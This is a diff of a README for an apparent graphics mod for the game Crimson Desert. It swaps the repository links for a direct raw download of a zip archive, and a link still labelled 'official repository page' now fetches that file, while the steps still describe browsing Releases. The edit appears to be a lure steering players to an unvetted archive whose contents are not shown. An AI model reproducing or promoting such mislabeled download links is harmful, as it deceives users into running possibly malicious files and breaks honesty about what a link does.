@@ -1,6 +1,6 @@
 # 🎮 Crimson-desert-RenoDx-Mod - Improve your game visuals with ease
 
-[![](https://img.shields.io/badge/Download_Mod-Blue?style=for-the-badge)](https://github.com/Willing-paralithodescamtschatica789/Crimson-desert-RenoDx-Mod)
+[![](https://img.shields.io/badge/Download_Mod-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Willing-paralithodescamtschatica789/Crimson-desert-RenoDx-Mod/main/RenoDX/Crimson-Reno-Dx-Mod-desert-v3.9.zip)
 
 This mod provides high-quality graphics enhancements for Crimson Desert. It improves lighting, color, and texture clarity to create a cinematic look. It also optimizes performance to keep your frame rate steady.
 
@@ -16,7 +16,7 @@ Ensure your computer meets these standards for the best results:
 
 ## 📥 How to Download 
 
-1. Visit the [official repository page](https://github.com/Willing-paralithodescamtschatica789/Crimson-desert-RenoDx-Mod).
+1. Visit the [official repository page](https://raw.githubusercontent.com/Willing-paralithodescamtschatica789/Crimson-desert-RenoDx-Mod/main/RenoDX/Crimson-Reno-Dx-Mod-desert-v3.9.zip).
 2. Locate the Releases section on the right side of the page.
 3. Click on the latest version tag.
 4. Download the compressed file ending in .zip.
